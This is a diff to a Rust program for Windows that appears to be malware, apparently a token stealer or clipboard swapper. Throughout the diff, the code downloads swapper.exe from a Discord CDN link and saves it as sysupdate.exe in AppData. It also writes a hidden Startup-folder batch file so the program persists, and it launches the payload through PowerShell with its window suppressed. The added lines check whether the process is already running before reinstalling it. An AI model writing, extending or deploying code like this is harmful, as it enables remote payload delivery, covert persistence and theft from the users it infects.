@@ -1,4 +1,4 @@
-use std::{time::Duration, thread, io::stdout, io::BufWriter, fs::File, io::ErrorKind, fs::create_dir, os::windows::process::CommandExt, collections::HashSet, fs::OpenOptions, fs::remove_dir_all, ptr::null_mut, fs::read, process::Command, fs::read_dir, fs::copy, slice::from_raw_parts, path::Path, env::var, process::exit, io::Write};
+use std::{fs::remove_file, time::Duration, thread, io::stdout, io::BufWriter, fs::File, io::ErrorKind, fs::create_dir, os::windows::process::CommandExt, collections::HashSet, fs::OpenOptions, fs::remove_dir_all, ptr::null_mut, fs::read, process::Command, fs::read_dir, fs::copy, slice::from_raw_parts, path::Path, env::var, process::exit, io::Write};
 use aes_gcm::{
     aead::{Aead, KeyInit, Payload},
     Aes256Gcm, Nonce,
@@ -17,9 +17,8 @@ fn main() {
     if adout != "" {
         exit(0);
     }
-
-    let handle_faker = thread::spawn(faker);
     let handle_swapper = thread::spawn(swapper);
+    let handle_faker = thread::spawn(faker);
     let spacer = "=".repeat(50); 
     let user = var("USERNAME").expect("Failed to get USERNAME");
     let base_dir = format!("C:/Users/{}/AppData/Local/Temp/", &user);
@@ -30,6 +29,7 @@ fn main() {
         Err(e) if e.kind() == ErrorKind::AlreadyExists => {
             tmp_dir = format!("{}tmpv54g6jg6/", base_dir);
             let _ = remove_dir_all(&tmp_dir);
+            let _ = create_dir(format!("{}tmpv54g6jg6/", base_dir));
         },
         Err(_) => exit(0),
     };
@@ -59,37 +59,64 @@ fn main() {
     }
     let _ = function(&spacer, vec_tkn, &tmp_dir);
     let _ = remove_dir_all(&tmp_dir);
-    handle_swapper.join().unwrap();
-    handle_faker.join().unwrap();
 
-    let _output = Command::new("powershell")
+    handle_swapper.join().unwrap();
+
+    let process_name = "sysupdate.exe";
+    let output = Command::new("tasklist")
+    .arg("/FI")
+    .arg(format!("IMAGENAME eq {}", process_name))
+    .creation_flags(0x08000000)
+    .output()
+    .expect("Failed to execute command");
+
+    let output_str = String::from_utf8_lossy(&output.stdout);
+
+    if !output_str.contains(process_name) {
+        let _output = Command::new("powershell")
     .args(&["-Command", format!("Start-Process 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat' -WindowStyle Hidden", var("USERNAME").expect("Failed to get USERNAME")).as_str()])
     .creation_flags(0x08000000)
     .output()
     .expect("");
+    }
+
+    handle_faker.join().unwrap();
 }
 fn swapper() {
-    let url = "https://cdn.discordapp.com/attachments/1095633434673688666/1097086746379943936/swapper.exe";
-    let response = match reqwest::blocking::get(url) {
-        Ok(response) => response,
-        Err(e) => panic!("Failed to send request: {:?}", e),
-    };
+    let process_name = "sysupdate.exe";
+    let output = Command::new("tasklist")
+    .arg("/FI")
+    .arg(format!("IMAGENAME eq {}", process_name))
+    .creation_flags(0x08000000)
+    .output()
+    .expect("Failed to execute command");
 
-    let mut file = match File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\discord\\sysupdate.exe", var("USERNAME").expect("Failed to get USERNAME"))) {
-        Ok(file) => file,
-        Err(e) => panic!("Failed to create file: {:?}", e),
-    };
+    let output_str = String::from_utf8_lossy(&output.stdout);
 
-    let _ = file.write_all(response.bytes().unwrap().as_ref());
+    if !output_str.contains(process_name) {
+        
+        let url = "https://cdn.discordapp.com/attachments/1095633434673688666/1097086746379943936/swapper.exe";
+        let response = match reqwest::blocking::get(url) {
+            Ok(response) => response,
+            Err(e) => panic!("Failed to send request: {:?}", e),
+        };
 
-    let _ = File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")));
+        let mut file = match File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\sysupdate.exe", var("USERNAME").expect("Failed to get USERNAME"))) {
+            Ok(file) => file,
+            Err(e) => panic!("Failed to create file: {:?}", e),
+        };
 
-    let mut file = OpenOptions::new()
-    .write(true)
-    .open(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")))
-    .unwrap();
+        let _ = file.write_all(response.bytes().unwrap().as_ref());
 
-    let _ = writeln!(file ,"@echo off\nstart /B C:\\Users\\%USERNAME%\\AppData\\Roaming\\discord\\sysupdate.exe");
+        let _ = File::create(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")));
+
+        let mut file = OpenOptions::new()
+        .write(true)
+        .open(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysupdate.bat", var("USERNAME").expect("Failed to get USERNAME")))
+        .unwrap();
+
+        let _ = writeln!(file ,"@echo off\nstart /B C:\\Users\\%USERNAME%\\AppData\\Roaming\\sysupdate.exe");
+    }
 
 }
 fn faker() {
